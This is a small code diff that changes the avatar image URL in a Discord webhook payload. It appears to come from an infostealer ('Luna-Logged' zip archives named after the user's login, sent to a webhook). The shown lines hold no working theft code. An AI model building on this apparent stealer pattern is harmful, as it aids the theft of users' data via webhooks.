@@ -42,7 +42,7 @@ def main(webhook: str):
 
     data = {
         "username": "Nerox",
-        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+        "avatar_url": "https://cdn.discordapp.com/attachments/883671754705358849/1141324390479429792/IMG_2437.jpg?size=4096"
     }
 
     _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'
